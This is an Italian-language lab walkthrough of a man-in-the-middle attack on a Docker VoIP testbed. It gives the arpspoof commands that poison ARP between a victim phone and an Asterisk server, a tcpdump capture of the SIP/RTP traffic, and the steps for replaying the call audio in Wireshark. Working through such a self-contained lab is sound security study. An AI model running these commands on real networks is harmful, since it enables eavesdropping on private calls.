# Attacco 1 

prima di tutto avviamo i container con docker compose up 

poi entriamo nel terminale dell' attaccante docker exec -it voip-attacker bash

verifichiamo ip_forward cat /proc/sys/net/ipv4/ip_forward

Poi avviamo ARp spoofing:
# 1) dì alla VITTIMA che "Asterisk sei tu"
arpspoof -i eth0 -t 172.20.0.20 172.20.0.10 > /dev/null 2>&1 &

# 2) dì ad ASTERISK che "la vittima sei tu"
arpspoof -i eth0 -t 172.20.0.10 172.20.0.20 > /dev/null 2>&1 &

# 3) cattura tutto il traffico UDP (SIP + RTP) su file
tcpdump -i eth0 -w /captures/voip.pcap udp

In un secondo terminale avvio la telefonata

docker attach voip-phone

digito 500 e dopo 15 sec premo b, poi ctrl p e ctrl q

ritorno nell altro terminale, premo ctrl c e poi pkill arpspoof e exit

con wireshark captures/voip.pcap 
ascolto l audio (telephony -> rtp -> rtp streams)
